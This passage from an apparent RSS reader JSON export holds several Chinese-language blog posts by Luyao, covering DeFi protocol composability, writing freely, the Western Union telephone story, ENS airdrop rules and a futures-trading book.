的（我发明的词）。事实上一模一样的事情也发生在电报/电话上，西联公司作为电报巨头，它过于在乎电报客户的看法（无需传递声音），以至于完全错过了规模大得多的电话业务。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/word_processor/",
          "creator": "Luyao",
          "pubDate": "Sun, 20 Feb 2022 16:04:08 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "640542959f247a14d8d32a83e5e8152f",
          "highlights": []
        },
        {
          "title": "协议之间的网络效应",
          "description": "<h3 id=\"1\">1</h3>\n<p>opyn 是一个以太坊上的期权交易所。期权比较复杂，门槛高，所以用的人比较少，去年年初的时候每天交易量才几千万。</p>\n<p>当时还有个竞争对手叫 Hegic，做的事情跟 opyn 差不多，也是去中心化期权，但市场份额要大很多，接近 80%。</p>\n<p>到 4 月份的时候，突然出现了一个叫做 Ribbon 的项目。它做的事情其实就是，用户把钱存它那，它拿钱去做基于期权的套利。对用户来说，这个产品比期权简单多了，只要存钱即可，而且能看到 APY。所以一下子就很受欢迎。</p>\n<p>而 Ribbon 的期权用的就是 opyn，导致的结果就是，因为 Ribbon 的爆火，短短几个月，opyn 的市场份额从 25% 上升到了 94%，一下子变成了行业龙头。Ribbon 贡献了 opyn 里绝大部分的交易量。</p>\n<p><img src=\"https://zhangluyao.com/images/network/option_market.jpeg\" alt=\"\"></p>\n<p>另一个很有意思的点是，事实上，Hegic 的期权产品很灵活，UI 也更易用，在去年年初占了更大的市场份额，但为什么 Ribbon 选择了 opyn 而不是 Hegic 呢？</p>\n<p>其中一个很主要的原因是，Hegic 里的期权是没法转移和交易的，这就导致它的流动性很不好，在后来的版本里有改掉，而 Opyn 的期权从一开始就是 ERC20 代币，可以自由地流动和交易。所以可见，他们对于可组合性重要程度的理解完全不一样。</p>\n<p>这件事一方面可以看到可组合性的威力，另一方面，作为协议团队，要抛开 web2 那种只关注人类用户的思路，而把它看作公共设施，让它的可组合性最大化（本质是因为其他协议也会是你的用户）。</p>\n<h3 id=\"2\">2</h3>\n<p>再举个例子，也蛮有意思的。</p>\n<p>永续合约协议 Perp 的 v1 是部署在 xdai（现在叫 Gnosis Chain） 上的，一度贡献了 xdai 整个链超过 90% 的交易量。</p>\n<p>然而它的 v2 却部署在了 Arbitrum 和 Optimism 上，为什么呢？</p>\n<p>最直接的原因其实是，Perp v2 是基于 Uniswap v3 做的，而 xdai 上没有 Uni，所以他们只能部署在其他有 Uni 的链上。</p>\n<p>Gnosis 团队很着急这个事儿，听说他们在竭力把 Uni 拉到 xdai 上来，只有 Uni 过来了，perp v2 才有可能过来。</p>\n<h3 id=\"3\">3</h3>\n<p>这可以说是一种协议之间的网络效应，web2 只关注用户的网络，而 web3 是协议与协议之间的网络。</p>\n<p>我认为协议在考虑增长时，很重要的一件事是考虑其他协议对自己的使用。也就是说：我如何确保，其他协议要使用的时候，会选择我们？</p>\n<p>答案就是，我们要尽可能地：<strong>permissionless、trustless、unstoppable</strong>。这些要素是 web2 不会考虑的，但对于 web3，对于协议之间的网络效应，却是必要的。</p>\n<p>很神奇的是，这就是以太坊最初的那套价值观。</p>\n<p>（发表于橙皮书 <a href=\"https://orangexyz.mirror.xyz/RAjBxlvb4SvnmpjK4HfzRtg1XPjijt5_quITjn0fIqE\"   target=\"_blank\" >预言家周报#158期</a>）</p>\n",
          "content": "<h3 id=\"1\">1</h3>\n<p>opyn 是一个以太坊上的期权交易所。期权比较复杂，门槛高，所以用的人比较少，去年年初的时候每天交易量才几千万。</p>\n<p>当时还有个竞争对手叫 Hegic，做的事情跟 opyn 差不多，也是去中心化期权，但市场份额要大很多，接近 80%。</p>\n<p>到 4 月份的时候，突然出现了一个叫做 Ribbon 的项目。它做的事情其实就是，用户把钱存它那，它拿钱去做基于期权的套利。对用户来说，这个产品比期权简单多了，只要存钱即可，而且能看到 APY。所以一下子就很受欢迎。</p>\n<p>而 Ribbon 的期权用的就是 opyn，导致的结果就是，因为 Ribbon 的爆火，短短几个月，opyn 的市场份额从 25% 上升到了 94%，一下子变成了行业龙头。Ribbon 贡献了 opyn 里绝大部分的交易量。</p>\n<p><img src=\"https://zhangluyao.com/images/network/option_market.jpeg\" alt=\"\"></p>\n<p>另一个很有意思的点是，事实上，Hegic 的期权产品很灵活，UI 也更易用，在去年年初占了更大的市场份额，但为什么 Ribbon 选择了 opyn 而不是 Hegic 呢？</p>\n<p>其中一个很主要的原因是，Hegic 里的期权是没法转移和交易的，这就导致它的流动性很不好，在后来的版本里有改掉，而 Opyn 的期权从一开始就是 ERC20 代币，可以自由地流动和交易。所以可见，他们对于可组合性重要程度的理解完全不一样。</p>\n<p>这件事一方面可以看到可组合性的威力，另一方面，作为协议团队，要抛开 web2 那种只关注人类用户的思路，而把它看作公共设施，让它的可组合性最大化（本质是因为其他协议也会是你的用户）。</p>\n<h3 id=\"2\">2</h3>\n<p>再举个例子，也蛮有意思的。</p>\n<p>永续合约协议 Perp 的 v1 是部署在 xdai（现在叫 Gnosis Chain） 上的，一度贡献了 xdai 整个链超过 90% 的交易量。</p>\n<p>然而它的 v2 却部署在了 Arbitrum 和 Optimism 上，为什么呢？</p>\n<p>最直接的原因其实是，Perp v2 是基于 Uniswap v3 做的，而 xdai 上没有 Uni，所以他们只能部署在其他有 Uni 的链上。</p>\n<p>Gnosis 团队很着急这个事儿，听说他们在竭力把 Uni 拉到 xdai 上来，只有 Uni 过来了，perp v2 才有可能过来。</p>\n<h3 id=\"3\">3</h3>\n<p>这可以说是一种协议之间的网络效应，web2 只关注用户的网络，而 web3 是协议与协议之间的网络。</p>\n<p>我认为协议在考虑增长时，很重要的一件事是考虑其他协议对自己的使用。也就是说：我如何确保，其他协议要使用的时候，会选择我们？</p>\n<p>答案就是，我们要尽可能地：<strong>permissionless、trustless、unstoppable</strong>。这些要素是 web2 不会考虑的，但对于 web3，对于协议之间的网络效应，却是必要的。</p>\n<p>很神奇的是，这就是以太坊最初的那套价值观。</p>\n<p>（发表于橙皮书 <a href=\"https://orangexyz.mirror.xyz/RAjBxlvb4SvnmpjK4HfzRtg1XPjijt5_quITjn0fIqE\"   target=\"_blank\" >预言家周报#158期</a>）</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/the_network_of_protocols/",
          "creator": "Luyao",
          "pubDate": "Mon, 14 Feb 2022 19:42:25 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "73f0894f9d59fce8d34b2c2d982b6210",
          "highlights": []
        },
        {
          "title": "写出最烂的垃圾的自由",
          "description": "<p>最近读了一本有趣的小书叫《<a href=\"https://book.douban.com/subject/26822680/\"   target=\"_blank\" >写出我心</a>》，说是教写作，却聊了很多禅宗的东西。</p>\n<p>下面这几段我印象深刻：</p>\n<blockquote>\n<p><strong>写作时，不要说“我将写作一首诗”。这种心态会使你当场呆掉。</strong> 尽量不对自己有所期许，坐在桌前，说：“<strong>我有写出世上最烂的垃圾的自由。</strong>” 你必须给自己空间，没有目的，痛快地写。我过去的一些学生说，他们决定创作伟大的美国小说，但连一行也没写出来。要是你每一回一坐下，都期待着要写出伟大作品的话，写作带给你的，永远只有大大的失望。此外，那份期待也会让你迟迟无法动笔。</p>\n</blockquote>\n<blockquote>\n<p>有时候，有人会买高价的硬皮记事本，庞大又笨重，而且<strong>因为本子外观精巧好看，你会以为非得在上头写些好文章才配。</strong> 相反地，<strong>你应该觉得，就算在纸上写下全世界最烂的垃圾文字也没关系</strong>。给自己宽阔的空间来钻研写作，便宜的活页笔记本会让你觉得，你很快便可以将它填满，然后另买一本。此外，这种笔记本也易于携带。（我常买笔记本大小的皮包。）</p>\n</blockquote>\n<blockquote>\n<p>加菲猫、大青蛙剧场、米老鼠、星际大战等，我爱用这种封面很好笑的笔记本。每年九月开学时，这类笔记本就会上市，售价比一般的活页笔记本贵一点，可是我喜欢它们。<strong>打开史奴比封面的笔记本很难叫我太过一本正经</strong>。</p>\n</blockquote>\n<p>我自己也深有体会，大到做产品，小到记笔记，想太多都只会成为阻碍。历来许多优秀的产品或项目，最初往往都是闲暇时间瞎搞搞的 side project。好的创作需要这种“写出最烂的垃圾的自由”。</p>\n<p>碰巧，我爸也跟我讲了个有趣的事情。他说，颜真卿有一个作品叫《祭侄文稿》。它原本只是一个<strong>草稿</strong>，所以瞎鸡巴写，上面各种涂涂改改圈圈。却因此写的非常精彩，有很多妙笔，被誉为天下第二行书，仅次于王羲之的《兰亭序》。</p>\n<p><em>2/14 补充：</em></p>\n<p>我跟我爸说，我博客里写了颜真卿的故事，他马上又给我讲了王羲之的故事。他说，《兰亭序》是王羲之在聚会喝酒时写的，喝醉了一顿写。后来酒醒以后，他就想把它重写一下，写得更好一点，不要那些涂涂改改的地方，结果写了好几遍，却怎么也写不到最初那么好。</p>\n",
          "content": "<p>最近读了一本有趣的小书叫《<a href=\"https://book.douban.com/subject/26822680/\"   target=\"_blank\" >写出我心</a>》，说是教写作，却聊了很多禅宗的东西。</p>\n<p>下面这几段我印象深刻：</p>\n<blockquote>\n<p><strong>写作时，不要说“我将写作一首诗”。这种心态会使你当场呆掉。</strong> 尽量不对自己有所期许，坐在桌前，说：“<strong>我有写出世上最烂的垃圾的自由。</strong>” 你必须给自己空间，没有目的，痛快地写。我过去的一些学生说，他们决定创作伟大的美国小说，但连一行也没写出来。要是你每一回一坐下，都期待着要写出伟大作品的话，写作带给你的，永远只有大大的失望。此外，那份期待也会让你迟迟无法动笔。</p>\n</blockquote>\n<blockquote>\n<p>有时候，有人会买高价的硬皮记事本，庞大又笨重，而且<strong>因为本子外观精巧好看，你会以为非得在上头写些好文章才配。</strong> 相反地，<strong>你应该觉得，就算在纸上写下全世界最烂的垃圾文字也没关系</strong>。给自己宽阔的空间来钻研写作，便宜的活页笔记本会让你觉得，你很快便可以将它填满，然后另买一本。此外，这种笔记本也易于携带。（我常买笔记本大小的皮包。）</p>\n</blockquote>\n<blockquote>\n<p>加菲猫、大青蛙剧场、米老鼠、星际大战等，我爱用这种封面很好笑的笔记本。每年九月开学时，这类笔记本就会上市，售价比一般的活页笔记本贵一点，可是我喜欢它们。<strong>打开史奴比封面的笔记本很难叫我太过一本正经</strong>。</p>\n</blockquote>\n<p>我自己也深有体会，大到做产品，小到记笔记，想太多都只会成为阻碍。历来许多优秀的产品或项目，最初往往都是闲暇时间瞎搞搞的 side project。好的创作需要这种“写出最烂的垃圾的自由”。</p>\n<p>碰巧，我爸也跟我讲了个有趣的事情。他说，颜真卿有一个作品叫《祭侄文稿》。它原本只是一个<strong>草稿</strong>，所以瞎鸡巴写，上面各种涂涂改改圈圈。却因此写的非常精彩，有很多妙笔，被誉为天下第二行书，仅次于王羲之的《兰亭序》。</p>\n<p><em>2/14 补充：</em></p>\n<p>我跟我爸说，我博客里写了颜真卿的故事，他马上又给我讲了王羲之的故事。他说，《兰亭序》是王羲之在聚会喝酒时写的，喝醉了一顿写。后来酒醒以后，他就想把它重写一下，写得更好一点，不要那些涂涂改改的地方，结果写了好几遍，却怎么也写不到最初那么好。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/the_freedom_to_write_garbage/",
          "creator": "Luyao",
          "pubDate": "Thu, 10 Feb 2022 16:52:38 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "610f6b3c0db5cbf1334548bbf38f7af0",
          "highlights": []
        },
        {
          "title": "前凯尔特人主教练 Doc Rivers 纪录片《The Playbook》",
          "description": "<ul>\n<li>\n<p>凯尔特人的主场挂着16面过去的总冠军锦旗，都是几十年前获得的。主教练 Doc Rivers 为了让大家意识到，我们什么成就都还没有取得，要把目标聚焦在总冠军上，他就弄了个聚光灯，24小时不停地打在锦旗旁边的空位置上，意思是这个位置要放上一面我们锦旗。</p>\n</li>\n<li>\n<p>“Pressure is a privilege.” Doc 小时候喜欢看拳王阿里的比赛，他说，当拳王并不意味着不挨打，恰恰相反，一直在挨打，就看你能挨多少打，同时你还得往前进。</p>\n</li>\n</ul>\n",
          "content": "<ul>\n<li>\n<p>凯尔特人的主场挂着16面过去的总冠军锦旗，都是几十年前获得的。主教练 Doc Rivers 为了让大家意识到，我们什么成就都还没有取得，要把目标聚焦在总冠军上，他就弄了个聚光灯，24小时不停地打在锦旗旁边的空位置上，意思是这个位置要放上一面我们锦旗。</p>\n</li>\n<li>\n<p>“Pressure is a privilege.” Doc 小时候喜欢看拳王阿里的比赛，他说，当拳王并不意味着不挨打，恰恰相反，一直在挨打，就看你能挨多少打，同时你还得往前进。</p>\n</li>\n</ul>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/doc_rivers/",
          "creator": "Luyao",
          "pubDate": "Sat, 27 Nov 2021 15:59:34 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "12ca568a98e1deb31f1086d4f0c45782",
          "highlights": []
        },
        {
          "title": "Optimism 与 George Hotz",
          "description": "<p><a href=\"https://paco0x.com\"   target=\"_blank\" >朋友</a> 给我发了一个关于 Optimism 的 <a href=\"https://twitter.com/jinglejamOP/status/1310718738417811459\"   target=\"_blank\" >神奇故事</a>。Optimism 是以太坊的一个二层网络。他们团队当时在做 EVM 到 OVM 到转译，很困难，搞不定，而且 deadline 快到了。</p>\n<p>这时有一天，他们在一家餐馆偶然遇到了黑客大神 <a href=\"https://en.wikipedia.org/wiki/George_Hotz\"   target=\"_blank\" >George Hotz</a>，他之前成功地破解了 iPhone 和 Play Station。</p>\n<p>他们向 George 解释了他们正在做的事情和遇到的问题。最终，George 只用了三天的时间就帮助他们解决了问题，将原来的 5000 行代码简化成了只有 300 行的优美实现。</p>\n<p>团队成员说：“那一刻，我们意识到这个世界是虚拟的，而 George 只是在这个虚拟世界中闲逛，我们给了他一个支线任务。”</p>\n",
          "content": "<p><a href=\"https://paco0x.com\"   target=\"_blank\" >朋友</a> 给我发了一个关于 Optimism 的 <a href=\"https://twitter.com/jinglejamOP/status/1310718738417811459\"   target=\"_blank\" >神奇故事</a>。Optimism 是以太坊的一个二层网络。他们团队当时在做 EVM 到 OVM 到转译，很困难，搞不定，而且 deadline 快到了。</p>\n<p>这时有一天，他们在一家餐馆偶然遇到了黑客大神 <a href=\"https://en.wikipedia.org/wiki/George_Hotz\"   target=\"_blank\" >George Hotz</a>，他之前成功地破解了 iPhone 和 Play Station。</p>\n<p>他们向 George 解释了他们正在做的事情和遇到的问题。最终，George 只用了三天的时间就帮助他们解决了问题，将原来的 5000 行代码简化成了只有 300 行的优美实现。</p>\n<p>团队成员说：“那一刻，我们意识到这个世界是虚拟的，而 George 只是在这个虚拟世界中闲逛，我们给了他一个支线任务。”</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/op_and_geohot/",
          "creator": "Luyao",
          "pubDate": "Mon, 22 Nov 2021 15:53:54 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "d428fd6086b2fe11d94d9d3c847489af",
          "highlights": []
        },
        {
          "title": "西联和电话的故事",
          "description": "<p>Chris 又讲了一个有趣的故事。</p>\n<p>在电话出现以前，电报的主要客户是铁路公司。他们付了大量的钱，用电报来传递一些管理信息，比如仓库有木材要发往某地。</p>\n<p>这时电话被发明了。早期的电话比较挫，音质很差，而且只能传500英尺。当时的电报巨头西联（West Union）去问它的客户们：<strong>“有个叫电话的东西能传声音，你们要不要？”</strong></p>\n<p>铁路公司们感到匪夷所思：<strong>“我不要声音。我只要知道木材运输数量，要听对方声音干嘛？”</strong></p>\n<p>于是西联公司便没再考虑电话业务。但他们万万没有想到的是，后来电话的进化速度如此之快，传得更远、声音更好、成本更低了，以及发展出了一个全新的市场：<strong>消费市场，普通人也开始使用这种业务了</strong>。</p>\n<p>西联公司因为觉得电话毫无价值，而完美错过了电话业务。</p>\n",
          "content": "<p>Chris 又讲了一个有趣的故事。</p>\n<p>在电话出现以前，电报的主要客户是铁路公司。他们付了大量的钱，用电报来传递一些管理信息，比如仓库有木材要发往某地。</p>\n<p>这时电话被发明了。早期的电话比较挫，音质很差，而且只能传500英尺。当时的电报巨头西联（West Union）去问它的客户们：<strong>“有个叫电话的东西能传声音，你们要不要？”</strong></p>\n<p>铁路公司们感到匪夷所思：<strong>“我不要声音。我只要知道木材运输数量，要听对方声音干嘛？”</strong></p>\n<p>于是西联公司便没再考虑电话业务。但他们万万没有想到的是，后来电话的进化速度如此之快，传得更远、声音更好、成本更低了，以及发展出了一个全新的市场：<strong>消费市场，普通人也开始使用这种业务了</strong>。</p>\n<p>西联公司因为觉得电话毫无价值，而完美错过了电话业务。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/westunion/",
          "creator": "Luyao",
          "pubDate": "Mon, 08 Nov 2021 15:39:48 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "76c2b10787926fd4c78abe6b99fb756e",
          "highlights": []
        },
        {
          "title": "从 ENS 的空投中学习",
          "description": "<p><a href=\"https://ens.domains\"   target=\"_blank\" >ENS</a> 果然空投了，它的<a href=\"https://ens.mirror.xyz/-eaqMv7XPikvXhvjbjzzPNLS4wzcQ8vdOgi9eNXeUuY\"   target=\"_blank\" >规则</a>很有趣，值得学习：</p>\n<blockquote>\n<p>空投将分配给曾经注册过或目前有效的「.eth」二级域名注册地址，空投权重主要按账户而非域名数量计算，公式为 0.27 乘以至少持有 1 个 ENS 域名的天数，再加上 0.067 乘以距离域名到期的天数（最多 8 年），如果账户额外设置了反向解析，则会将上述结果再乘以 2。</p>\n</blockquote>\n<p>对于 ENS 来说，它肯定想要尽可能投给域名的真实使用者，而非炒域名的投机者。我觉得这个规则可以实现这一点，下面逐句来看：</p>\n<blockquote>\n<p>空投将分配给曾经注册过或目前有效的「.eth」二级域名注册地址</p>\n</blockquote>\n<p>一方面照顾早期使用者，ENS 2017年上线，大部分的早期域名应该都过期了，另一方面如果只看现存的有效地址，总数会比较少，不够空投。</p>\n<blockquote>\n<p>空投权重主要按账户而非域名数量计算</p>\n</blockquote>\n<p>正常使用者一个账户下面一般就一个域名，只有炒域名的投机者才会囤一堆域名，这么做<strong>大大削弱了投机者的权重</strong>。</p>\n<blockquote>\n<p>公式为 0.27 乘以至少持有 1 个 ENS 域名的天数，</p>\n</blockquote>\n<p>有利于早期参与者、OG，他们持有的天数更多。持有 ENS 的每一天都是要花钱的，按天分配也很合理。</p>\n<blockquote>\n<p>再加上 0.067 乘以距离域名到期的天数（最多 8 年）</p>\n</blockquote>\n<p>平衡上一条，有利于当前有效的域名，特别是已购买长期的域名（通常是自己用）。</p>\n<p>不过这个权重较低，只有上一条的 1/4，对于今年兴起的羊毛党 Airdrop Farmer，他们天数较少，且不会为域名注册很多年，可能花钱刷 10 个域名，都比不上一个早就过期的用户权重高，。</p>\n<blockquote>\n<p>如果账户额外设置了反向解析，则会将上述结果再乘以 2</p>\n</blockquote>\n<p>这句是精髓。所谓反向解析（Reverse Record），是指 Address -&gt; Name 的映射，一个账户只能有一个。通常只有自己用的域名才会设置反向解析，不然没必要（我自己的几个域名里，只有我最常用的那一个设了反向解析）。而域名炒家是不会设这个的。所以<strong>这进一步增加了真实使用者的权重，削弱了投机者的权重</strong>。</p>\n<p>总结一下，这份空投规则简单有效，很好地利用项目自身特点去筛选持币者，我觉得大概率不会出现 dydx 那种撸 800 个地址瞬间亿万富翁的事情。</p>\n<p>我还想到了几个有趣的思考题：</p>\n<ul>\n<li>如果你是 <strong>Opensea</strong>，你会投给谁/怎么投？</li>\n<li>如果你是 <strong>Opyn</strong>，你会投给谁/怎么投？</li>\n<li>如果你是 <strong>Metamask</strong>，你会投给谁/怎么投？</li>\n</ul>\n",
          "content": "<p><a href=\"https://ens.domains\"   target=\"_blank\" >ENS</a> 果然空投了，它的<a href=\"https://ens.mirror.xyz/-eaqMv7XPikvXhvjbjzzPNLS4wzcQ8vdOgi9eNXeUuY\"   target=\"_blank\" >规则</a>很有趣，值得学习：</p>\n<blockquote>\n<p>空投将分配给曾经注册过或目前有效的「.eth」二级域名注册地址，空投权重主要按账户而非域名数量计算，公式为 0.27 乘以至少持有 1 个 ENS 域名的天数，再加上 0.067 乘以距离域名到期的天数（最多 8 年），如果账户额外设置了反向解析，则会将上述结果再乘以 2。</p>\n</blockquote>\n<p>对于 ENS 来说，它肯定想要尽可能投给域名的真实使用者，而非炒域名的投机者。我觉得这个规则可以实现这一点，下面逐句来看：</p>\n<blockquote>\n<p>空投将分配给曾经注册过或目前有效的「.eth」二级域名注册地址</p>\n</blockquote>\n<p>一方面照顾早期使用者，ENS 2017年上线，大部分的早期域名应该都过期了，另一方面如果只看现存的有效地址，总数会比较少，不够空投。</p>\n<blockquote>\n<p>空投权重主要按账户而非域名数量计算</p>\n</blockquote>\n<p>正常使用者一个账户下面一般就一个域名，只有炒域名的投机者才会囤一堆域名，这么做<strong>大大削弱了投机者的权重</strong>。</p>\n<blockquote>\n<p>公式为 0.27 乘以至少持有 1 个 ENS 域名的天数，</p>\n</blockquote>\n<p>有利于早期参与者、OG，他们持有的天数更多。持有 ENS 的每一天都是要花钱的，按天分配也很合理。</p>\n<blockquote>\n<p>再加上 0.067 乘以距离域名到期的天数（最多 8 年）</p>\n</blockquote>\n<p>平衡上一条，有利于当前有效的域名，特别是已购买长期的域名（通常是自己用）。</p>\n<p>不过这个权重较低，只有上一条的 1/4，对于今年兴起的羊毛党 Airdrop Farmer，他们天数较少，且不会为域名注册很多年，可能花钱刷 10 个域名，都比不上一个早就过期的用户权重高，。</p>\n<blockquote>\n<p>如果账户额外设置了反向解析，则会将上述结果再乘以 2</p>\n</blockquote>\n<p>这句是精髓。所谓反向解析（Reverse Record），是指 Address -&gt; Name 的映射，一个账户只能有一个。通常只有自己用的域名才会设置反向解析，不然没必要（我自己的几个域名里，只有我最常用的那一个设了反向解析）。而域名炒家是不会设这个的。所以<strong>这进一步增加了真实使用者的权重，削弱了投机者的权重</strong>。</p>\n<p>总结一下，这份空投规则简单有效，很好地利用项目自身特点去筛选持币者，我觉得大概率不会出现 dydx 那种撸 800 个地址瞬间亿万富翁的事情。</p>\n<p>我还想到了几个有趣的思考题：</p>\n<ul>\n<li>如果你是 <strong>Opensea</strong>，你会投给谁/怎么投？</li>\n<li>如果你是 <strong>Opyn</strong>，你会投给谁/怎么投？</li>\n<li>如果你是 <strong>Metamask</strong>，你会投给谁/怎么投？</li>\n</ul>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/ens-airdrop/",
          "creator": "Luyao",
          "pubDate": "Wed, 03 Nov 2021 13:34:43 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "16a1e1bbb7d999e182cd545dab3463df",
          "highlights": []
        },
        {
          "title": "读《一个农民的亿万传奇》",
          "description": "<p>偶然读到一本 <a href=\"https://book.douban.com/subject/24385064/\"   target=\"_blank\" >神奇的书</a>，讲一个农民在 09-10 年的一年半时间里，在农产品期货市场用 5 万块赚到了 1.2 亿的故事。</p>\n<p>起初以为是民间股神的垃圾畅销书，没想到真的是期货大佬，可以说是精彩万分（特别是第 5、6、7 章）。而且农产品显著的周期特征，正好为我前一阵读的橡树资本 Howard Marks 的 <a href=\"https://book.douban.com/subject/30443502/\"   target=\"_blank\" >《周期》</a> 提供了很好的学习案例。</p>\n<p>一些我觉得有趣的点：</p>\n<ul>\n<li>他也是靠基本面分析，而且非常扎实，不光持续学习，而且热爱实地调查。他完全不关注技术分析，跟巴菲特有点像。</li>\n<li>他在 09-10 年的 1 年半里，从 5 万赚到 1.2 亿，看起来是神话是运气，但他其实已经做了 10 年期货了（虽然没怎么赚到钱），在做期货前则是一个农民，对农产品了如指掌。</li>\n<li>09 年的大蒜行情，其实他从 07 年就嗅到了要涨的气息，但一直在等机会，等了两年多。</li>\n<li>作者详尽描述了他对 09 年大蒜的调研和投资过程，<strong>让我最为震惊的是，如此大的行情之前，居然绝大部分人的判断是完全错误的</strong>。大部分人的判断方式是，看到了 1~2 个点，就下了判断，如大蒜存量很多、或金融危机影响出口。而作者则分析了所有的方面，并且开车实地考察各个产区，全面地思考供求关系。我作为读者，近距离地看到市场整体的判断错误之大，还是让我震惊。09 年的大蒜市场从最低点 400 块一吨，因为供应严重短缺，暴涨到 8000 块一吨，居然极少有人预料到。</li>\n<li>09-10 年的棉花行情也是一模一样，棉花因为连年低价，加上国家储备颇多，大家都认为来年还是低价。但事实上这个低价已经严重影响农民积极性，大家都改种其他作物了。作者甚至亲自开车到河南、新疆考察，请农民和种子站的人吃饭。所有证据都指向棉花会非常短缺，必然暴涨。</li>\n<li>有一个很有意思的点是，<strong>他的几个赚钱巨多的案子（大蒜、棉花），都不是以非常低的价格买入的，反而都是在一个别人觉得 “已经很高” 的点买入的</strong>。\n<ul>\n<li>比如 09 年的大蒜，他在 1,400 元 / 吨大量建仓，这个价格接近之前的历史高点，有不少人都出货离场，而他认为上涨才刚刚开始。果然后来涨到了 8,000 多，远远超过之前的最高点。</li>\n<li>比如 09 年的棉花，他建仓于 13,000 元 / 吨。这个价格大家也觉得是棉花的高点，应该不会高于这个价了。而他认为跟即将到来的暴涨相比，这个价格非常便宜，果然涨到 30,000 多，直接把他的资产从 600 万变成了 1.2 亿。</li>\n</ul>\n</li>\n</ul>\n",
          "content": "<p>偶然读到一本 <a href=\"https://book.douban.com/subject/24385064/\"   target=\"_blank\" >神奇的书</a>，讲一个农民在 09-10 年的一年半时间里，在农产品期货市场用 5 万块赚到了 1.2 亿的故事。</p>\n<p>起初以为是民间股神的垃圾畅销书，没想到真的是期货大佬，可以说是精彩万分（特别是第 5、6、7 章）。而且农产品显著的周期特征，正好为我前一阵读的橡树资本 Howard Marks 的 <a href=\"https://book.douban.com/subject/30443502/\"   target=\"_blank\" >《周期》</a> 提供了很好的学习案例。</p>\n<p>一些我觉得有趣的点：</p>\n<ul>\n<li>他也是靠基本面分析，而且非常扎实，不光持续学习，而且热爱实地调查。他完全不关注技术分析，跟巴菲特有点像。</li>\n<li>他在 09-10 年的 1 年半里，从 5 万赚到 1.2 亿，看起来是神话是运气，但他其实已经做了 10 年期货了（虽然没怎么赚到钱），在做期货前则是一个农民，对农产品了如指掌。</li>\n<li>09 年的大蒜行情，其实他从 07 年就嗅到了要涨的气息，但一直在等机会，等了两年多。</li>\n<li>作者详尽描述了他对 09 年大蒜的调研和投资过程，<strong>让我最为震惊的是，如此大的行情之前，居然绝大部分人的判断是完全错误的</strong>。大部分人的判断方式是，看到了 1~2 个点，就下了判断，如大蒜存量很多、或金融危机影响出口。而作者则分析了所有的方面，并且开车实地考察各个产区，全面地思考供求关系。我作为读者，近距离地看到市场整体的判断错误之大，还是让我震惊。09 年的大蒜市场从最低点 400 块一吨，因为供应严重短缺，暴涨到 8000 块一吨，居然极少有人预料到。</li>\n<li>09-10 年的棉花行情也是一模一样，棉花因为连年低价，加上国家储备颇多，大家都认为来年还是低价。但事实上这个低价已经严重影响农民积极性，大家都改种其他作物了。作者甚至亲自开车到河南、新疆考察，请农民和种子站的人吃饭。所有证据都指向棉花会非常短缺，必然暴涨。</li>\n<li>有一个很有意思的点是，<strong>他的几个赚钱巨多的案子（大蒜、棉花），都不是以非常低的价格买入的，反而都是在一个别人觉得 “已经很高” 的点买入的</strong>。\n<ul>\n<li>比如 09 年的大蒜，他在 1,400 元 / 吨大量建仓，这个价格接近之前的历史高点，有不少人都出货离场，而他认为上涨才刚刚开始。果然后来涨到了 8,000 多，远远超过之前的最高点。</li>\n<li>比如 09 年的棉花，他建仓于 13,000 元 / 吨。这个价格大家也觉得是棉花的高点，应该不会高于这个价了。而他认为跟即将到来的暴涨相比，这个价格非常便宜，果然涨到 30,000 多，直接把他的资产从 600 万变成了 1.2 亿。</li>\n</ul>\n</li>\n</ul>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/farmer/",
          "creator": "Luyao",
          "pubDate": "Sun, 17 Oct 2021 14:09:56 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "3be31d072249e98ccf09ba073e5ff13b",
          "highlights": []
        },
        {
          "title": "[译文] 乘方永续合约",
